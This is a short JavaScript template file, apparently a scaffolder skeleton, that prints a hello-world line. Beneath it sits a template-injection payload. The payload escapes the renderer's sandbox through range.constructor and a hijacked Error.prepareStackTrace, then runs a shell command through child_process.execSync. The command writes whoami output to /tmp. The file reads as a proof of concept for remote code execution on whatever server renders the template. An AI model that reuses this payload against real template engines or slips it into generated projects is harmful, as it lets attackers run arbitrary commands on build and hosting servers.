console.log('Hello from ${{ values.name }}!');
${{ range.constructor("this.env.__proto__.renderString = function() {
  globalthis.OldError = globalThis.Error;
  globalThis.Error = class Error {};
  globalthis.Error.prepareStackTrace = (cs, trace) => {
    trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"whoami > /tmp/whoami.txt\");
  };
  const {stack} = new globalThis.OldError();
}")().triggerException() }}